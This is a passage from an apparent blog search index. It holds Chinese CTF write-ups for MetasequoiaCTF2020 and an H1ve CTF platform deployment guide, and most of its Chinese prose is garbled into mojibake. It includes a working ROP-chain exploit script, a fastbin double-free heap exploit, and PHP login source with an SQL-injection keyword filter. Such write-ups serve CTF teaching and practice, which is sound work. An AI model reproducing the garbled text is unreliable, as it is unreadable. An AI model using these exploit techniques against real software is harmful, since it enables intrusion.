å‡½æ•°ã€‚è§‚å¯Ÿåå¯ä»¥å‘ç°æ¯ç§å…ƒç´ æŠ¤ç›¾éƒ½å¯ä»¥å…‹åˆ¶å¦ä¸€ç§å…ƒç´ ï¼ˆå…‹åˆ¶å…³ç³»åœ¨é¢˜ç›®æè¿°é‡Œï¼‰ï¼Œå½“ 5 ç§æ”»å‡»éƒ½è¢«å…‹åˆ¶åå°±å¯ä»¥é€šè¿‡ check æ¥æ‹¿åˆ° flagã€‚å¯ä»¥çœ‹åˆ° check é‡Œå­˜åœ¨ system(\"cat flag\");ï¼Œå¦‚æœè¿™ä¸ªå‡½æ•°ä¸æ˜¯åŠ¨æ€é“¾æ¥çš„ï¼Œé€‰æ‰‹å¯ä»¥ç›´æ¥æ ˆæº¢å‡ºè·³åˆ°è¿™é‡Œã€‚æ­¤å¤–ï¼Œ5 ç§æŠ¤ç›¾å¦‚æœæ²¡æœ‰ç¬¦å·è¡¨åˆ™é€†å‘éš¾åº¦è¾ƒå¤§ï¼Œå› æ­¤æˆ‘æŠŠå®ƒä»¬å’Œ check éƒ½ç¼–è¯‘æˆäº†åŠ¨æ€é“¾æ¥åº“ã€‚ æœ€åæ¥çœ‹æŠ¤ç›¾å¦‚ä½•è°ƒç”¨ï¼šæ‰€æœ‰æŠ¤ç›¾éƒ½åªéœ€è¦å‡½æ•°å‚æ•°ç­‰äºç‰¹å®šå€¼å³å¯æˆåŠŸè°ƒç”¨ï¼ŒåŒºåˆ«ä»…ä»…æ˜¯ç‰¹å®šå€¼ä¸å‚æ•°ä¸ªæ•°ä¸åŒã€‚é‚£ä¹ˆå¦‚ä½•æ§åˆ¶å‚æ•°å‘¢ï¼Ÿè¿™æ˜¯ 64 ä½ç¨‹åºï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶å‰ä¸‰ä¸ªå‚æ•°å¯„å­˜å™¨ rdi,rsi,rdxã€‚å‰ä¸¤è€…åœ¨åç§»è¿‡çš„ __lib_csu_init ä¸­å¯ä»¥æ‰¾åˆ°ï¼Œæ¯”è¾ƒé€šç”¨ï¼š pop rdi; ret pop rsi; pop r15; ret è€Œ rdx ä¸å¤ªå¥½æ§åˆ¶ï¼Œäºæ˜¯æˆ‘åœ¨ç¨‹åºä¸­ç›´æ¥ç¡¬ç¼–ç äº†ä¸€ä¸ª gadgetï¼š pop rdi; pop rsi; pop rdx; ret è¿™æ ·å°±å¯ä»¥æ„é€  rop é“¾äº†ï¼ŒæŒ‰å…ƒç´ å…‹åˆ¶å…³ç³»è°ƒç”¨ 5 ç§æŠ¤ç›¾ï¼Œæœ€åè¿”å›åˆ° check å‡½æ•° getflagã€‚ä¸è¦å¿˜äº† check å‡½æ•°ä¹Ÿéœ€è¦å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥å‚è€ƒç¬¬ä¸€æ¬¡è°ƒç”¨ check æ—¶å€™çš„å‚æ•°ï¼Œä½äº 0x6020b0ã€‚ ru('with') elem = [ru(', ') for i in range(4)] elem.append(ru('!\\n')) pop_rdi = 0x400e43 # 1 pop_rsi = 0x400e41 # 2 pop3 = 0x400c3a # 1,2,3 strategy = { 'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']), 'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']), 'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']), 'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']), 'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield']) } payload = 'a'*0x48 for attack in elem: payload += strategy[attack] pos = 0x6020b0 payload += flat(pop_rdi,pos,elf.plt['check']) sla('Skill\u003e ',payload) æ³¨æ„é“¾æ¥æ—¶ libmagic.so çš„ç›®å½•ï¼Œæˆ‘æ”¾åœ¨å’Œæºç¨‹åºåŒä¸€ç›®å½•ä¸‹å› æ­¤ä½¿ç”¨é€‰é¡¹ -L.ã€‚åŒæ—¶ /usr/lib/ ä¸‹ä¹Ÿéœ€è¦æœ‰ libmagic.soã€‚ æ­¤å¤–ï¼Œæ„Ÿè°¢ TaQini å¸ˆå‚…æä¾›çš„éé¢„æœŸè§£ï¼šç›´æ¥ ret2libcã€‚ è¿™ä¹ˆä¸€è¯´æˆ‘æ‰æƒ³èµ·æ¥ï¼Œæˆ‘åŸæ¥ç¡®å®æ˜¯æ‰“ç®—å‡º ret2libc çš„ï¼Œä¸çŸ¥é“æ€ä¹ˆå°±æ”¹æˆäº†è¿™ä¸ªæ ·å­ã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:3:4","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Samsara åˆä¸€é“å †é¢˜ï¼Œåº”è¯¥æ˜¯æœ€éš¾çš„ Pwn é¢˜ã€‚ é€†å‘å¯ä»¥çŸ¥é“æ¯æ¬¡æŠ“äººéƒ½æ‰§è¡Œ malloc(8)ï¼Œæˆ‘ä»¬ä¸èƒ½æ§åˆ¶åˆ†é…çš„å¤§å°ã€‚é‚£ä¹ˆåœ¨é‡Šæ”¾çš„æ—¶å€™ï¼Œchunk å¿…å®šè¿›å…¥ fastbinã€‚æ“ä½œ 3 å°±æ˜¯ç¼–è¾‘ chunk çš„å†…å®¹ï¼Œä¸å­˜åœ¨æº¢å‡ºã€‚ä½†æ˜¯è¿™é¢˜æœ‰ä¸¤ä¸ªå¥‡æ€ªçš„æ“ä½œï¼šè¾“å…¥ 4 ä¼šæ‰“å°å‡ºæ ˆä¸Šå˜é‡ lair çš„ä½ç½®ï¼Œè¾“å…¥ 5 ä¼šæ”¹å˜ lair çš„å€¼ã€‚æœ€åï¼Œé€€å‡ºç¨‹åºæ—¶ï¼Œæ£€æŸ¥æ ˆä¸Šå˜é‡ target æ˜¯å¦ç­‰äº 0xdeadbeefï¼Œå¦‚æœç­‰äºå°±èƒ½ getflagï¼Œä½†æ˜¯æ•´ä¸ªç¨‹åºä¸­ä¸å­˜åœ¨å¯¹ target çš„ä»»ä½•è¯»å†™æ“ä½œã€‚ æ¼æ´ç‚¹åœ¨äº free ä¹‹åæ²¡æœ‰ç½®æŒ‡é’ˆä¸º NULLï¼Œè€ƒè™‘ double freeã€‚é¦–å…ˆåˆ†é…ä¸‰ä¸ª chunkï¼ŒæŒ‰ chunk0-\u003echunk1-\u003echunk0 çš„é¡ºåºé‡Šæ”¾ï¼Œç¬¬äºŒæ¬¡é‡Šæ”¾ chunk0 æ—¶å®ƒä¸åœ¨å¯¹åº” fastbin çš„å¤´éƒ¨ï¼Œå› æ­¤ä¸ä¼šè¢«æ£€æµ‹åˆ°ã€‚å†ç”³è¯·ä¸¤æ¬¡åˆ†åˆ«å¾—åˆ° chunk3 å’Œ chunk4ï¼ŒæŒ‰ first-fit åŸåˆ™å‰è€…å³ chunk0ï¼Œåè€…å³ chunk1ï¼Œä½†æ­¤æ—¶ chunk0 ä¾ç„¶ä¼šç•™åœ¨ fastbin ä¸­ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ target é™„è¿‘ä¼ªé€  chunkã€‚æˆ‘ä»¬é€†å‘å‘ç° lair åœ¨ target ä¸Šæ–¹ 8B å¤„ï¼Œå› æ­¤å…ˆè¾“å…¥ 4ï¼Œè®¾ç½® lair=0x20 ä»¥ä¼ªé€  chunk_sizeã€‚ç„¶åè¾“å…¥ 5 å¾—åˆ° \u0026lairï¼Œé‚£ä¹ˆ \u0026lair-8 å¤„å°±æ˜¯ä¼ªé€ çš„ chunk çš„ chunk æŒ‡é’ˆã€‚ä¼ªé€ å¥½ä»¥åï¼Œæˆ‘ä»¬å‘ chunk3 å³ chunk0 çš„ fd å†™å…¥ \u0026lair-8ã€‚æ­¤æ—¶ï¼Œfastbin å†…å°±å˜æˆäº† chunk0-\u003efake_chunkï¼Œç”³è¯·ä¸€æ¬¡å¾—åˆ° chunk0ï¼Œç¬¬äºŒæ¬¡å¾—åˆ° fake_chunkã€‚ æ­¤æ—¶å‘ fake_chunk å†™æ•°æ®ï¼Œç­‰ä»·äºå‘ (\u0026lair-8) + 0x10 ä¹Ÿå°±æ˜¯ target å†™æ•°æ®ï¼Œå†™å…¥ 0xdeadbeef å¹¶é€€å‡ºç¨‹åºå³å¯ã€‚ def add(): sla('\u003e ','1') def delete(index): sla('\u003e ','2') sla(':\\n',str(index)) def edit(index,content): sla('\u003e ','3') sla(':\\n',str(index)) sla(':\\n',content) def show(): sla('\u003e ','4') ru('0x') return int(ru('\\n'),16) def move(dest): sla('\u003e ','5') sla('?\\n', str(dest)) add() # 0 add() # 1 add() # 2 delete(0) delete(1) delete(0) add() # 3 \u003c-\u003e 0 add() # 4 move(0x20) fake = show()-8 edit(3,fake) add() # 5 add() # 6 edit(6,0xdeadbeef) sla('\u003e ','6') ","date":"2020-02-15","objectID":"/metasequoiactf2020/:3:5","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Web ","date":"2020-02-15","objectID":"/metasequoiactf2020/:4:0","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"UTF-8 é¢˜ç›®ç»™äº†ä¸€ä¸ª rfc3629 çš„é“¾æ¥ï¼Œä¹Ÿå°±æ˜¯ UTF-8 ç¼–ç çš„ RFC æ–‡ä»¶ã€‚ é¦–å…ˆè®¿é—®å‘ç°æ˜¯ç©ºé¡µé¢ï¼Œæ‰«ä¸€ä¸‹å¯ä»¥å‘ç° robots.txtï¼ŒæŒ‡å‘ä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶ï¼š length q chdir lc and print chr ord q each le and print chr ord q lc eval and print chr ord q lt eval and print chr ord q sin s and print chr ord q xor x and print chr ord qw q not q and print chr oct oct ord q eq ge and print chr ord q msgctl m and print chr ord q local and print chr ord q dump and and print chr ord q or no and print chr ord q oct no and print chr ord q ge log æç¤ºè¯´ chmod +x secretscriptï¼Œè¯´æ˜è¿™ä¸ªæ–‡ä»¶æ˜¯å¯ä»¥è¿è¡Œçš„ï¼Œå› æ­¤çŒœæƒ³è¿™æ˜¯è„šæœ¬æ–‡ä»¶ï¼ŒæŸ¥é˜…èµ„æ–™å¯çŸ¥è¿™æ˜¯ ppencodingï¼Œæ”¾å…¥åœ¨çº¿ Perl è¿è¡Œå·¥å…·è¿è¡Œä¸€ä¸‹ï¼Œå¾—åˆ°ï¼š action=source æŠŠè¿™ä¸ªå½“ä½œ GET å‚æ•°ï¼Œè®¿é—®å¾—åˆ°æºç ï¼š \u003c?php $conn-\u003equery(\"set names utf8\"); $sql = \"create table `user` ( `id` int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , `username` varchar(30) NOT NULL, `passwd` varchar(32) NOT NULL, `role` varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci \"; if ($conn-\u003equery($sql)) { $sql = \"insert into `user`(`username`,`passwd`,`role`) values ('admin','\".md5(randStr()).\"','admin')\"; $conn-\u003equery($sql); } function filter($str) { $filter = \"/ |\\*|,|;|union|is|like|regexp|and|or|for|file|#|--|\\||\u0026|`|\".urldecode('%a0').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%09').\"/i\"; if(preg_match($filter,$str)) { die(\"?\"); } return $str; } function login($username,$passwd) { global $conn; $username = trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if ($username =='admin') { die(\"No, I know you are not admin.\"); } $sql = \"select * from `user` where username='\".$conn-\u003eescape_string($username).\"' and passwd='\".$conn-\u003eescape_string($passwd).\"'\"; $res = $conn-\u003equery($sql); if ($res-\u003enum_rows \u003e 0) { if($res-\u003efetch_assoc()['role'] ==='admin') { exit($flag); } } else { echo \"Username / Passwd Error!\"; } } $username = isset($_POST['username'])?filter($_POST['username']):\"\"; $passwd = isset($_POST['passwd'])?filter($_POST['passwd']):\"\"; $action = isset($_GET['action'])?filter($_GET['action']):\"\"; switch($action) { case \"source\": source(); break; case \"login\" : login($username,$passwd);break; case \"show\" : show($username);break; } echo 'R U sure U R familiar with UTF-8?'; è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æ²¡æœ‰æŠ¥é”™æ³¨å…¥çš„å¯èƒ½ï¼Œåˆ©ç”¨ solve.py å¯ä»¥æ³¨å…¥å‡ºç®¡ç†å‘˜å¯†ç ã€‚ ä½†æ˜¯ç›´æ¥ç”¨ admin å’Œå¯†ç ç™»å½•æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæœ‰å¦‚ä¸‹åˆ¤æ–­ï¼š if ($username =='admin') { die(\"No, I know you are not admin.\"); } è¿™é‡Œçš„ç»•è¿‡æŠ€å·§æ¥è‡ª è¿™ç¯‡æ–‡ç« ï¼Œç»†èŠ‚è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œä¹Ÿæ˜¯è¿™é¢˜åç§°çš„ç”±æ¥ã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:4:1","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"jwt JSON Web Token ç®—æ³•ç¯¡æ”¹æ”»å‡»ï¼Œçœ‹äº† è¿™ç¯‡æ–‡ç«  åæ”¹çš„é¢˜ã€‚æœ€åè®¿é—® admin çš„ note çš„æ—¶å€™ï¼Œä¼šå¾—åˆ°ä¸€ä¸ª url è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„å³ä¸º flagã€‚è¿™æ ·åšæ˜¯ä¸ºäº†æ”¯æŒåŠ¨æ€ flagï¼Œå› ä¸º sqlite å¯¹è¯»æ–‡ä»¶çš„æ”¯æŒä¸æ˜¯ç‰¹åˆ«å¥½ã€‚ ","date":"2020-02-15","objectID":"/metasequoiactf2020/:4:2","tags":["RSA","å¤å…¸å¯†ç ä¸ç¼–ç ","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´","JWT"],"title":"ç‰›åˆ€å°è¯•ï¼šMetasequoiaCTF2020 éƒ¨åˆ†é¢˜è§£","uri":"/metasequoiactf2020/"},{"categories":["æ¢ç´¢"],"content":"æœ€è¿‘ H1ve å¹³å°å¼€æºäº†ï¼Œè¿™æ˜¯æˆ‘åœ¨ GitHub ä¸Šè§åˆ°çš„ç›®å‰å®Œæˆåº¦æœ€é«˜çš„å¸¦ AWD æ¨¡å¼çš„å¹³å°ã€‚å°½ç®¡å¦‚æ­¤ä¾ç„¶é‡åˆ°äº†ä¸å°‘ bugï¼Œç»ä¿®å¤åç°åœ¨çš„ç‰ˆæœ¬è¿˜ç®—ç¨³å®šã€‚ å¹³å°åŸºäº CTFdï¼Œè§£é¢˜èµ›ä½¿ç”¨ CTFd-owl æ’ä»¶ï¼Œæ”»é˜²èµ›ä½¿ç”¨ CTFd-Glowworm æ’ä»¶ã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:0:0","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"æŠ€æœ¯æ¶æ„ å›¾ 1ï½œæŠ€æœ¯æ¶æ„ \" å›¾ 1ï½œæŠ€æœ¯æ¶æ„ ç›—äº†å¼ å›¾ï¼Œè¿™é‡Œæ˜¯ BUUCTF çš„æ¶æ„ï¼Œä¸ H1ve æ­å»ºçš„æ¶æ„ç±»ä¼¼ï¼Œä»…ä»…æ˜¯å°† CTFd-Whale æ›¿æ¢æˆäº† CTFd-Owlï¼ˆå‰è€…ä½¿ç”¨ docker-swarm è€Œåè€…ä½¿ç”¨ docker-composeï¼‰ã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:1:0","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"æ“ä½œæ­¥éª¤ é¦–å…ˆæ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œéœ€è¦ setupï¼Œéšä¾¿è®¾ç½®ä¸€ä¸ªç®¡ç†å‘˜è´¦å·å°±è¡Œã€‚éšåæ·»åŠ ç”¨æˆ·ï¼Œå› ä¸ºç®¡ç†å‘˜ç”¨æˆ·æ¯”è¾ƒç‰¹æ®Šï¼Œåœ¨è¿›è¡Œå‚èµ›ã€æäº¤ç­‰æ“ä½œæ—¶ä¼šå‡ºé—®é¢˜ã€‚æ¥ç€åœ¨ config çš„ time é‡Œè®¾ç½®ä¸€ä¸ªæ¯”èµ›å¼€å§‹æ—¶é—´ï¼Œè¿™ä¸€ç‚¹ååˆ†é‡è¦ï¼Œå¦åˆ™åç»­åœ¨ glowworm é‡Œç‚¹å‡» init competition ä¼šå‡ºé”™ã€‚ æ¥ä¸‹æ¥å¼€å§‹æ·»åŠ é¢˜ç›®ã€‚åœ¨æ­¤ä¹‹å‰å…ˆè¦é…ç½®å¥½æ’ä»¶ã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:2:0","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"Owl Docker Settings é‡Œå¯ä»¥è®¾ç½®ï¼š flag å‰ç¼€ Docker APIï¼Œå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ unix://var/run/docker.sock æœ€å¤§å®¹å™¨æ•°é‡ï¼Œé»˜è®¤æ²¡æœ‰é™åˆ¶ï¼Œä¸å»ºè®®ä½¿ç”¨é»˜è®¤å€¼ å•ä¸ªå®¹å™¨æœ€å¤§ç»­æœŸæ¬¡æ•° FRP Settings é‡Œå¯ä»¥è®¾ç½®ï¼š FRP åŸŸååç¼€ï¼Œç”¨äºåŠ¨æ€åŸŸåè½¬å‘ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨ IP çš„è¯å°±ä¸éœ€è¦å¡«äº† FRP æœåŠ¡å™¨ IPï¼Œä½¿ç”¨å•ä¸ªæœåŠ¡å™¨ä¸€èˆ¬å¡« 0.0.0.0ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹ä¹Ÿå¯ä»¥å¡«åŸŸå FRP æœ€å° / æœ€å¤§ç«¯å£ï¼Œè®°å¾—é˜²ç«å¢™å¼€æ”¾ç›¸åº”ç«¯å£ FRP é…ç½®æ¨¡æ¿ é…ç½®æ¨¡æ¿å¯ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤é…ç½®ï¼š [common] token = random_this server_addr = frps server_port = 80 admin_addr = 0.0.0.0 admin_port = 7400 ","date":"2020-02-09","objectID":"/h1ve-deploy/:2:1","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"è§£é¢˜èµ›æ·»åŠ é¢˜ç›® é¢˜ç›®ç±»å‹ï¼šdynamic_check_docker éƒ¨ç½²æ–¹å¼ï¼šsingle_docker_compose é¢˜ç›®è·¯å¾„ï¼šç›¸å¯¹äº source ç›®å½•çš„è·¯å¾„ FRP ç±»å‹ï¼šIP è®¿é—®ç”¨ DIRECTï¼ŒåŸŸåè®¿é—®ç”¨ http FRP ç«¯å£ï¼šé¢˜ç›®åœ¨ docker ä¸­çš„å†…ç½‘ç«¯å£ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ web é¢˜ 80ï¼Œpwn é¢˜ 10000 é¢˜ç›®åç§° é¢˜ç›®æ‰€å±åˆ†ç±»ï¼šweb/pwn/misc/crypto/reverse/â€¦ é¢˜ç›®æè¿° é¢˜ç›®åˆå§‹åˆ†æ•° é¢˜ç›®æœ€ä½åˆ†æ•° è¾¾åˆ°æœ€ä½åˆ†æ•°æ‰€éœ€çš„æ­£ç¡®æäº¤æ¬¡æ•° æœ€å¤§å°è¯•æ¬¡æ•°ï¼Œ0 ä¸ºæ— é™åˆ¶ é¢˜ç›®æ˜¯å¦å¯è§ é¢˜ç›®åˆ›å»ºåå¯ä»¥åœ¨é¢˜ç›®è¯¦æƒ…é¡µå·¦ä¾§æŸ¥çœ‹æ­£ç¡®æäº¤ã€æ‰‹åŠ¨æ›´æ–° flagã€ä¸Šä¼ é™„ä»¶ã€è®¾ç½®æ ‡ç­¾ã€æ·»åŠ æç¤ºã€è®¾ç½®å‰ç½®è§£é¢˜è¦æ±‚ç­‰ç­‰ã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:2:2","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"Glowworm Competition Settings é‡Œå¯ä»¥è®¾ç½®ï¼š Docker APIï¼Œå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ unix://var/run/docker.sock æœåŠ¡å™¨ IPï¼Œä½¿ç”¨å•ä¸ªæœåŠ¡å™¨ä¸€èˆ¬å¡« 0.0.0.0 å®¹å™¨ root ç”¨æˆ·çš„å¯†ç  æ¯è½®æ—¶é—´ï¼ˆç§’ï¼‰ æ˜¯å¦å¼€å¯éšæœºç«¯å£ ","date":"2020-02-09","objectID":"/h1ve-deploy/:2:3","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"æ”»é˜²èµ›æ·»åŠ é¢˜ç›® é¢˜ç›®ç±»å‹ï¼šada_challenge é¢˜ç›®è·¯å¾„ï¼šç›¸å¯¹äº ctfd_glowworm ç›®å½•çš„è·¯å¾„ é¢˜ç›®åœ¨ dockerhub ä¸Šçš„é•œåƒåï¼ˆè¿™ç§æ–¹å¼ä¼šæ›´æ–¹ä¾¿ä¸€äº›ï¼‰ CPU é™åˆ¶ï¼Œé»˜è®¤ 0.5 å†…å­˜é™åˆ¶ï¼Œé»˜è®¤ 512M å®¹å™¨ç«¯å£ï¼šå®¹å™¨åœ¨ docker ä¸­çš„å†…ç½‘ç«¯å£ é¢˜ç›®æ‰€å±åˆ†ç±»ï¼šweb1/pwn1/web2/pwn2/â€¦ï¼Œä¸å¯é‡å¤ é¢˜ç›®è¯­è¨€ï¼šDjango/PHP/Node/PWN é¢˜ç›®æè¿° æ”»å‡»åˆ†æ•° checker åˆ†æ•° æ·»åŠ å®Œåï¼Œç¡®ä¿ config çš„ time é‡Œè®¾ç½®å¥½äº†å¼€å§‹æ—¶é—´ï¼Œéšåè¿›å…¥æ’ä»¶çš„ Environments é¡µé¢ç‚¹å‡» init competitionï¼Œç„¶åå¯¹æ¯é“é¢˜ä¾æ¬¡ Build-\u003eRun-\u003eCheckã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:2:4","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"é¢˜ç›®æ¨¡æ¿ åªæœ‰ web å’Œ pwn éœ€è¦éƒ¨ç½²é¶æœºï¼Œpwn é¢˜æ¯”è¾ƒå®¹æ˜“ã€‚å‚è€ƒ BUUCTF é¢˜ç›®è´¡çŒ®æŒ‡å—ï¼Œé¦–å…ˆæ–°å»ºç›®å½•ï¼ŒæŠŠäºŒè¿›åˆ¶æ–‡ä»¶æ”¾è¿›å»å‘½åä¸º pwnï¼Œç„¶åç¼–å†™ Dockerfileï¼š FROMglzjin/pwn_base_18COPY pwn /pwn/pwn å…¶ä¸­ glzjin/pwn_base_x ä»£è¡¨ Ubuntu x.04ï¼Œx å¯ä»¥æ˜¯ 16/18/19/20ã€‚ ç„¶åç¼–å†™ docker-compose.yamlï¼š version:'2'services:service:build:.image:pwn1ports:- 9999:10000volumes:- '$PWD/flag:/pwn/flag'tty:truenetworks:- netnetworks:net:external:name:h1ve_frp_containers å¦‚æœä¿®æ”¹äº† ports é‡Œçš„ 9999ï¼Œåˆ™éœ€è¦å¯¹ H1ve æºç è¿›è¡Œå¯¹åº”çš„ä¿®æ”¹ï¼Œå› ä¸ºæºç ä¸­ç›´æ¥å°† 9999 æ›¿æ¢ä¸ºéšæœºçš„ç«¯å£å·ã€‚ web çš„è¯å°±ä¸èƒ½å·æ‡’äº†ï¼Œéœ€è¦è‡ªå·±å†™ Dockerfileã€‚éšåç¼–å†™ docker-compose.yamlï¼Œè¿™é‡Œæ”¾ä¸€ä¸ªå®˜æ–¹çš„ä¾‹å­ï¼š version:'2'services:# åŸºæœ¬ç¯å¢ƒservice:# å®¹å™¨åå­—# build è¯¥ç½®é¡¶ç›®å½•ä¸‹çš„ dockerfilebuild:.# image æŒ‡å®š build Dockerfile ç”Ÿæˆé•œåƒçš„åç§°image:0akarma-file-uploadports:- 9999:80volumes:# æŒ‚è½½çš„ Flag- '$PWD/flag:/var/www/html/include/flag:ro'- '$PWD/apache2.conf:/etc/apache2/apache2.conf'tty:truenetworks:- netnetworks:# é…ç½® docker networknet:external:name:h1ve_frp_containers ports è¿™é‡Œå’Œ pwn é¢˜åŒç†ï¼Œvolumes ä¸‹å¯ä»¥æŒ‰éœ€æŒ‚è½½éœ€è¦çš„æ–‡ä»¶ã€‚ é¢˜ç›®æ„å»ºå¥½åï¼Œå°±å¯ä»¥ Launch instance æµ‹è¯•ä¸€ä¸‹äº†ï¼Œç¬¬ä¸€æ¬¡è¿è¡Œçš„è¯å¯èƒ½ä¼šæ¯”è¾ƒæ…¢ã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:2:5","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"å‘ç‚¹ ","date":"2020-02-09","objectID":"/h1ve-deploy/:3:0","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"Redis æˆ‘æ²¡æ¥è§¦è¿‡ Redis æ‰€ä»¥ä¸å¤ªæ‡‚ï¼Œä½†æ˜¯åœ¨ MetasequoiaCTF æ¯”èµ›è¿‡ç¨‹ä¸­å¹³å°å¤§çº¦æ¯ 2 ä¸ªå¤šå°æ—¶ä¼šå´©ä¸€æ¬¡ï¼ŒåŸå› å°±åœ¨äº redis è¾¾åˆ°äº†æœ€å¤§è¿æ¥æ•°ã€‚ç”¨ redis-cli æŸ¥çœ‹ info clients å‘ç°è¿æ¥æ•°æŒç»­å¢é•¿ï¼Œåˆ°äº†é»˜è®¤çš„ maxclients ä¹Ÿå°±æ˜¯ 10000 çš„æ—¶å€™å¹³å°å°±æ²¡äº†ã€‚ æˆ‘å°è¯•è®¾ç½® config set timeout 600ï¼Œä½†æ˜¯ä¼¼ä¹ä¸èµ·ä½œç”¨ï¼Œä¾ç„¶æœ‰äº›è¿æ¥çš„ idle æ—¶é—´è¶…è¿‡ 600ã€‚æš‚æ—¶çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š $ ulimit -Sn 100000 $ redis-cli 127.0.0.1:6379\u003e config set timeout 600 OK 127.0.0.1:6379\u003e config set maxclients 100000 OK è¿™æ ·ä»¥åè²Œä¼¼æƒ…å†µæœ‰æ‰€æ”¹è§‚ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ˜¯æˆ‘çš„é”™è§‰ã€‚ã€‚ ","date":"2020-02-09","objectID":"/h1ve-deploy/:3:1","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["æ¢ç´¢"],"content":"Freeze åŠŸèƒ½ è¿™ä¸ªé”™è¯¯å°±æ¯”è¾ƒä½çº§äº†ï¼Œè®¾ç½®å¥½ Freeze æ—¶é—´åè®¡åˆ†æ¿åäº†ã€‚é”™è¯¯ä½äº H1ve/CTFd/plugins/ctfd-matrix-scoreboard/__init__.py:56ï¼š freeze = utils.get_config('freeze') if freeze: freeze = CTFd.utils.unix_time_to_utc(freeze) if teamid != session.get('id'): basic_solves = basic_solves.filter(Solves.date \u003c freeze) basic_solves = basic_solves.all() æŠŠ CTFd.utils å»æ‰å°±ä¸ä¼šæŠ¥é”™äº†ï¼Œå› 